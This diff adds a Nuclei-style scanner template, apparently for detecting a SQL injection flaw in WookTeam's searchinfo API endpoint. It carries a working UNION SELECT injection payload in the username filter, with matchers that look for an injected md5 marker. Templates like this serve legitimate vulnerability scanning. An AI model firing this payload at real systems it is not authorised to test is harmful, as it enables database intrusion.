@@ -1,0 +1,37 @@
+id: wookteam-searchinfo-sqli
+info:
+  name: WookTeam searchinfo SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2C{{t2}}%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"username":'
+          - "{{t2}}"
+      - type: word
+        part: header
+        words:
+          - "wookteam_session="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
